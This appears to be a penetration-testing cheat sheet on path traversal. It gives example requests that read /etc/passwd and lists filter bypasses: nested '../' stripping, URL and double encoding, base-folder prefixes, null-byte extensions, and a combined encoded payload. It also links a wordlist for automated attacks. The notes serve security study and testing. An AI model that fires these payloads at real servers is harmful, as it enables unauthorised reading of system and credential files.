# Path traversal

## <mark style="color:purple;">General info</mark>

Consider

```html
<img src="/loadImage?filename=218.png">
```

An attacker can request the following URL to retrieve the `/etc/passwd` file from the server's filesystem.

`https://insecure-website.com/loadImage?filename=../../../etc/passwd`

## <mark style="color:purple;">Bypass defences</mark>

* Elimination (strip): `../` -> `....//`
  * Test: try to change the orginal request `GET /image?filename=1.jpg` to `GET /image?filename=../1.jpg`
  * If the file is loaded the code strip `../`
* Encode: `../` ->`%2e%2e%2f`
* Double-encode: `../` ->`%252e%252e%252f`
* Require to start with the expected base folder es. `/var/www/images` -> `filename=/var/www/images/../../../etc/passwd`
* Require to end with an expected file extension es. `.png` -> `filename=../../../etc/passwd%00.png`
* Others

{% hint style="info" %}
**Note**: On Windows, both `../` and `..\` are valid directory traversal sequences.
{% endhint %}

## <mark style="color:purple;">Tips</mark>

* Don't always trust error messages
  * `GET /image?filename=/etc/passwd` -> "No such file"
    * Try to add null byte: `GET /image?filename=/etc/passwd%00`
    * Try to add null byte and extension: `GET /image?filename=/etc/passwd%00.png`
* Combine the cases:
  * Example: `....//....//....//etc/passwd%00.jpg` (strip, double-encode, null byte, whitelist exstension)
  * `%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252Fetc%252Fpasswd%252500%252Ejpg`

## <mark style="color:purple;">Automatic exploitation</mark>

Use intruder with this list: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/deep\_traversal.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/deep_traversal.txt)&#x20;
